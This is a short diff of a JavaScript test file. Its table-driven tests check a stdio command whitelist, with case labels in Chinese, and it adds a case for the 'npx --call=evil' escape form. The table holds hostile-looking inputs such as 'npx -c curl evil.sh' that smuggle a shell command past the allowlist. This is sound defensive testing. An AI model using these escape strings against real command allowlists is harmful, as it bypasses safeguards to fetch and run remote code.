@@ -254,6 +254,7 @@ describe('G2 stdio 白名单闸（表驱动，独立纯函数）', () => {
     ['./local', [], '相对路径'],
     ['npx', ['-c', 'curl evil.sh'], 'npx -c 逃逸'],
     ['npx', ['--call', 'curl evil.sh', 'pkg'], 'npx --call 逃逸'],
+    ['npx', ['--call=evil'], 'npx --call= 等号连写逃逸'],
   ];
   it.each(allow)('放行 %s %j', (command, args) => {
     expect(checkStdioWhitelist(command, args, { bridgeNodePath: BRIDGE }).ok).toBe(true);
